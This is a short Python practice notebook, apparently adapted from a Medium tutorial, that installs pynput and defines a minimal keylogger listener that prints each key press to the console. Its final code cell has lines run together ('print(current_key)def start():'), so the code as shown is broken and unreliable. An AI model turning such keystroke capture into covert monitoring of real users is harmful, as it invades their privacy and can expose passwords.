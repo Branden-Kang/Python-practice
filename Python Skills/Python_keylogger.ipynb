{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Python keylogger.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyOkE+kLuzCAJvcOEFu/tCyr"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "SL4yxHGSiv-p"
      },
      "source": [
        "[Reference](https://medium.com/void-main/python-keylogger-create-a-keylogger-in-just-10-lines-of-code-856ad093d1f7)"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "05VMNRHuijYp",
        "outputId": "bcfe3be9-1be5-4302-f20d-2aa835994e11"
      },
      "source": [
        "pip install pynput"
      ],
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Collecting pynput\n",
            "  Downloading pynput-1.7.3-py2.py3-none-any.whl (99 kB)\n",
            "\u001b[?25l\r\u001b[K     |███▎                            | 10 kB 18.1 MB/s eta 0:00:01\r\u001b[K     |██████▋                         | 20 kB 21.6 MB/s eta 0:00:01\r\u001b[K     |█████████▉                      | 30 kB 21.9 MB/s eta 0:00:01\r\u001b[K     |█████████████▏                  | 40 kB 13.7 MB/s eta 0:00:01\r\u001b[K     |████████████████▍               | 51 kB 5.6 MB/s eta 0:00:01\r\u001b[K     |███████████████████▊            | 61 kB 5.6 MB/s eta 0:00:01\r\u001b[K     |███████████████████████         | 71 kB 6.0 MB/s eta 0:00:01\r\u001b[K     |██████████████████████████▎     | 81 kB 6.1 MB/s eta 0:00:01\r\u001b[K     |█████████████████████████████▋  | 92 kB 6.2 MB/s eta 0:00:01\r\u001b[K     |████████████████████████████████| 99 kB 3.9 MB/s \n",
            "\u001b[?25hRequirement already satisfied: six in /usr/local/lib/python3.7/dist-packages (from pynput) (1.15.0)\n",
            "Collecting evdev>=1.3\n",
            "  Downloading evdev-1.4.0.tar.gz (26 kB)\n",
            "Collecting python-xlib>=0.17\n",
            "  Downloading python_xlib-0.31-py2.py3-none-any.whl (179 kB)\n",
            "\u001b[K     |████████████████████████████████| 179 kB 22.6 MB/s \n",
            "\u001b[?25hBuilding wheels for collected packages: evdev\n",
            "  Building wheel for evdev (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for evdev: filename=evdev-1.4.0-cp37-cp37m-linux_x86_64.whl size=97570 sha256=a8e5972d839d309633ab6d01da18dab39adf10dfc253c6e1f481c2e2af55b760\n",
            "  Stored in directory: /root/.cache/pip/wheels/2e/1b/d7/59db567d50027628855552bcc4f9b607d3deb0d8eff8dabc79\n",
            "Successfully built evdev\n",
            "Installing collected packages: python-xlib, evdev, pynput\n",
            "Successfully installed evdev-1.4.0 pynput-1.7.3 python-xlib-0.31\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "5TvcO7rti4HD"
      },
      "source": [
        "import pynput.keyboard"
      ],
      "execution_count": 3,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "gkOJpmxEi4-T"
      },
      "source": [
        "def process_key_press(key):\n",
        "    current_key = str(key)\n",
        "    print(current_key)def start():\n",
        "    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)\n",
        "    with keyboard_listener:\n",
        "        keyboard_listener.join()start()"
      ],
      "execution_count": 4,
      "outputs": []
    }
  ]
}